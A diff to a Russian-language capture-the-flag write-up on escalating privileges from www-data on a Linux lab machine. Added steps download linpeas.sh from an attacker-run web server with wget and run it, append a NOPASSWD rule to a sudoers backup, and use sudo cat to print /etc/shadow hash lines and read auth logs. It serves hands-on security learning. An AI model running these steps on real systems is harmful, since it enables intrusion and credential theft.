@@ -61,13 +61,23 @@ put namefile
 <img width="695" height="668" alt="Снимок экрана 2026-04-27 в 21 45 21" src="https://github.com/user-attachments/assets/74dd248e-2827-4a02-b71e-fc3465b61a99" />
 в папке home есть два пользователя в wamp пусто а в merlin нет и там лежит 1й флаг 
 <img width="581" height="497" alt="Снимок экрана 2026-04-27 в 21 54 05" src="https://github.com/user-attachments/assets/a11adb3f-d560-4f9b-a6ab-52c06191af5c" />
+
+Решил отправить linpeas:
+
+на атакующей машине
 ```
-sudo python3 -m http.server 80 
+sudo python3 -m http.server 80
+```
+на сервере
+```
+#забираем файл
 wget http://ip/linpeas.sh
+#даем права
 chmod +x linpeas.sh
+#запуск (если слишком большой вывод + (> name.txt))
 ./linpeas
 ```
-intratack:
+linpeas показал что есть writebale sudoers.bak но тк я www-data у меня есть возможность только читать, вектор закрыт
 
 ```
 echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.bak
@@ -76,19 +86,24 @@ sudo: no tty present and no askpass program specified
 $ sudo -i
 sudo: no tty present and no askpass program specified
 ```
+Раз NOPASS cat решил почтиать файлы с паролями и логами 
 
+Пароли: 
+root - входит без пароля
+wampp - sha256
+merlin - md5 (но не смог его сломать)
 ```
 www-data@ubuntu:/$ sudo cat /etc/shadow
 sudo cat /etc/shadow
-root:!:18134:0:99999:7::: - no pass
+root:!:18134:0:99999:7::: 
 merlin:$1$EWeeql.h$8mH.7rEhPRGsOb5ECtmIe1:18134:0:99999:7:::
 wampp:$6$f8LMirW0$43znQ5kMsELDO9BdUmhbGkUEnVH2OKXZjfEtsyUgbvL79KoJtgLkdbJpHw4OuDDIMtaXjGjkjaRKD
 ```
-
+Читаю логи
 ```
 /var/log/auth.log
 ```
-cel
+цель машины стать юзером merlin
 ```
 Aug 25 21:19:31 ubuntu sudo:   merlin : TTY=pts/0 ; PWD=/home/merlin ; USER=root ; COMMAND=/bin/nano /root/root.txt
 ```
